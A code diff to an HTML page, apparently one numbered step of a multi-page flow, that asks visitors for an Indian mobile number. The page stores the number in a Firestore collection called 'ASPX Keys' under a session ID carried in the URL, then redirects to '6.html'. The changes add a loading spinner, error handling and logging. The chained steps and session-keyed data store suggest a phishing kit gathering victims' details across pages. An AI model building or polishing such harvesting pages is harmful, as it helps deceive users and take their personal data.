@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -28,8 +27,13 @@
         .terms { font-size: 14px; color: #6e6e80; margin-top: 30px; line-height: 1.5; }
         .terms a { color: #000; text-decoration: underline; cursor: pointer; }
         
-        .btn { width: 100%; background: #000; color: #fff; border: none; padding: 18px; border-radius: 35px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 40px; }
+        .btn { width: 100%; background: #000; color: #fff; border: none; padding: 18px; border-radius: 35px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 40px; transition: 0.3s; }
+        .btn:hover:not(:disabled) { background: #333; }
         .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        
+        .loading { display: none; text-align: center; margin-top: 20px; color: #6e6e80; font-size: 14px; }
+        .spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid #d1d1d6; border-top: 2px solid #000; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 8px; vertical-align: middle; }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
@@ -40,7 +44,7 @@
 
         <div class="field">
             <label>Mobile number</label>
-            <input type="text" id="mobile" placeholder="+91 1234567890" spellcheck="false">
+            <input type="text" id="mobile" placeholder="+91 1234567890" spellcheck="false" autocomplete="off">
             <div id="errorMsg" class="error">Please enter a valid number (e.g. +91 1234567890)</div>
         </div>
 
@@ -50,6 +54,9 @@
         </p>
 
         <button id="nextBtn" class="btn">Continue</button>
+        <div id="loading" class="loading">
+            <span class="spinner"></span>Connecting...
+        </div>
     </div>
 
     <script>
@@ -65,6 +72,7 @@
             measurementId: "G-6ZP1FPMKSJ"
         };
 
+        // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
 
@@ -75,6 +83,15 @@
         const mobileInput = document.getElementById('mobile');
         const nextBtn = document.getElementById('nextBtn');
         const errorMsg = document.getElementById('errorMsg');
+        const loadingDiv = document.getElementById('loading');
+
+        // Validate session on page load
+        window.addEventListener('load', () => {
+            if (!sessionId) {
+                alert("Session ID missing in URL. Please try again.");
+                nextBtn.disabled = true;
+            }
+        });
 
         async function submitData() {
             const val = mobileInput.value.trim();
@@ -86,46 +103,79 @@
                 return;
             }
 
-            if (phoneRegex.test(val)) {
-                errorMsg.style.display = 'none';
-                nextBtn.disabled = true;
-                nextBtn.innerText = "Connecting...";
-
-                try {
-                    // Update the existing document in "ASPX Keys" using the SESSION ID
-                    const docRef = db.collection("ASPX Keys").doc(sessionId);
-
-                    await docRef.set({
-                        mobile: val,
-                        updatedAt: new Date().toLocaleString() + " UTC+5:30"
-                    }, { merge: true }); // MERGE ensures we don't overwrite previous fields
-
-                    // Redirect to 6.html with the same session ID
-                    window.location.href = `6.html?session=${sessionId}`;
-
-                } catch (err) {
-                    console.error(err);
-                    alert("Error updating record. Try again.");
-                    nextBtn.disabled = false;
-                    nextBtn.innerText = "Continue";
-                }
-            } else {
+            if (!phoneRegex.test(val)) {
                 errorMsg.style.display = 'block';
+                return;
+            }
+
+            // Valid phone number - proceed with submission
+            errorMsg.style.display = 'none';
+            nextBtn.disabled = true;
+            nextBtn.style.display = 'none';
+            loadingDiv.style.display = 'block';
+
+            try {
+                console.log("Starting Firebase update with Session ID:", sessionId);
+                
+                // Update the existing document in "ASPX Keys" using the SESSION ID
+                const docRef = db.collection("ASPX Keys").doc(sessionId);
+
+                // Set data with merge to preserve existing fields
+                await docRef.set({
+                    mobile: val,
+                    updatedAt: new Date().toLocaleString() + " UTC+5:30"
+                }, { merge: true });
+
+                console.log("Firebase update successful, redirecting to 6.html");
+
+                // Wait a brief moment to ensure write completes, then redirect
+                setTimeout(() => {
+                    window.location.href = `6.html?session=${sessionId}`;
+                }, 500);
+
+            } catch (err) {
+                console.error("Firebase Error Details:", err);
+                
+                // Show specific error message
+                let errorMsg = "Error updating record. Please try again.";
+                if (err.code === 'permission-denied') {
+                    errorMsg = "Permission denied. Please contact support.";
+                } else if (err.code === 'unavailable') {
+                    errorMsg = "Service unavailable. Please try again later.";
+                }
+                
+                alert(errorMsg);
+                
+                // Reset button state
+                nextBtn.disabled = false;
+                nextBtn.style.display = 'block';
+                loadingDiv.style.display = 'none';
             }
         }
 
         // Click Event
         nextBtn.addEventListener('click', submitData);
 
-        // Enter Key = Next
+        // Enter Key = Submit
         mobileInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') submitData();
+            if (e.key === 'Enter' && !nextBtn.disabled) {
+                submitData();
+            }
         });
 
         // Auto-prefix +91
         mobileInput.addEventListener('focus', () => {
-            if (!mobileInput.value.startsWith('+91')) {
+            if (!mobileInput.value) {
                 mobileInput.value = '+91 ';
+            } else if (!mobileInput.value.startsWith('+91')) {
+                mobileInput.value = '+91 ' + mobileInput.value;
+            }
+        });
+
+        // Clear error on input
+        mobileInput.addEventListener('input', () => {
+            if (errorMsg.style.display === 'block') {
+                errorMsg.style.display = 'none';
             }
         });
     </script>
